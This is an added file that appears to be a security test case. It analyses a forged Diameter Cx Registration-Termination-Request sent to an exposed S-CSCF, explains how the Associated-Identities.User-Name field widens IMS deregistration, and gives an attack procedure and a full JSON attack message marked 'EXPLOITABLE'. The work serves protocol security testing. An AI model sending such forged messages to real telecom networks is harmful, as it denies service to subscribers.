@@ -1,0 +1,117 @@
+**Threat Model:**
+
+- **Attack Assumption:**  
+  A misconfigured **S-CSCF** exposes its **Cx Diameter** interface to the Internet. The attacker can impersonate the **HSS** role, establish an unauthenticated Diameter connection to the S-CSCF, and send a forged **Registration-Termination-Request (RTR)**. The S-CSCF accepts the RTR as authoritative HSS-originated deregistration input and processes the included subscriber identity scope.
+
+- **Attacker Capability:**  
+  The attacker can send crafted RTR requests and receive the corresponding answers on the attacker-controlled connection. The attacker cannot observe or alter legitimate HSS<->S-CSCF traffic, but can supply arbitrary values in the forged RTR, including the top-level `User-Name`, `Associated-Identities.User-Name`, `Public-Identity`, and `Deregistration-Reason` AVPs. The attacker knows at least one valid target IMS private identity and, for successful scope expansion, chooses additional private identities plausibly known to the target S-CSCF.
+
+**Exploitability Analysis:**
+
+`Associated-Identities.User-Name` in a Cx RTR is not mere metadata. In this procedure it is authoritative **scope-defining subscriber input** processed by the **S-CSCF**. The top-level `User-Name` identifies the anchor private identity, while `Associated-Identities` carries **other private user identities belonging to the same IMS subscription that should be deregistered together**. That means the target field directly affects **which identities are included in deregistration handling** beyond the primary one.
+
+This is materially different from the generic harm of forging an RTR. A forged RTR without `Associated-Identities` can already deregister the primary private identity/public identities in scope. However, manipulating `Associated-Identities.User-Name` can **expand or alter the set of additional private identities** that the S-CSCF treats as part of the same deregistration operation. That changes the receiver's local subscriber state and downstream behavior in a way specifically attributable to this field.
+
+The S-CSCF uses RTR to remove or update local registration-related information and trigger network-initiated deregistration handling. Per the supplied evidence, `Associated-Identities.User-Name` determines which **additional private identities** are processed together. If accepted, this causes the S-CSCF to apply deregistration-state updates across a broader IMS subscription identity set, affecting linked registration state, private<->public identity associations, and associated local service-profile handling for those identities. The effect persists until later legitimate IMS re-registration or subsequent corrective Cx procedures rebuild state.
+
+The impact is security-relevant and field-specific:
+
+- it can broaden IMS deregistration from one private identity to multiple associated private identities;
+- it can deny IMS registration/service for additional identities;
+- it can create incorrect subscriber-scope deregistration state and identity-mapping inconsistency within the S-CSCF.
+
+This satisfies field-specific exploitability because the additional harm is caused by the **value of this field itself**, not merely by the existence of the RTR procedure. The attacker is not just invoking deregistration; the attacker is manipulating **which associated identities** are included in that deregistration.
+
+Recovery is not immediate. Legitimate overwrite occurs only after later re-registration or subsequent HSS/S-CSCF state refresh/update. Thus the bad state is not purely transient packet-local input; it affects semi-persistent IMS registration state.
+
+**Attack Procedure:**
+
+Craft a minimal but coherent **Registration-Termination-Request (RTR)** from the attacker-controlled HSS-impersonating Diameter connection to the target S-CSCF. Include only mandatory and coherence-related AVPs needed for plausible processing, and exclude unrelated AVPs.
+
+Use a real or plausible primary private identity in the top-level `User-Name`, and place the malicious test value in:
+
+- `Associated-Identities` -> `User-Name`
+
+The malicious test value should be an **additional private identity** the attacker wants wrongly included in the deregistration scope, for example another IMPI believed to belong to the same IMS subscription already known to the S-CSCF.
+
+Include a plausible `Public-Identity` and a valid `Deregistration-Reason` such as `SERVER_CHANGE` to induce standard deregistration behavior without relying on provisioning-side permanent deletion semantics. The expected success condition is that the S-CSCF accepts the RTR and applies deregistration handling not only to the primary private identity but also to the additional private identity named in `Associated-Identities.User-Name`, causing broader IMS deregistration/service loss.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 304,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "hss.example.net;1720456789;cx-rtr-001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "impi-primary@example.net"
+    },
+    {
+      "avp_name": "Associated-Identities",
+      "grouped_avp": [
+        {
+          "avp_name": "User-Name",
+          "avp_value": "impi-secondary@example.net"
+        }
+      ]
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:alice@example.net"
+    },
+    {
+      "avp_name": "Deregistration-Reason",
+      "grouped_avp": [
+        {
+          "avp_name": "Reason-Code",
+          "avp_value": "SERVER_CHANGE"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
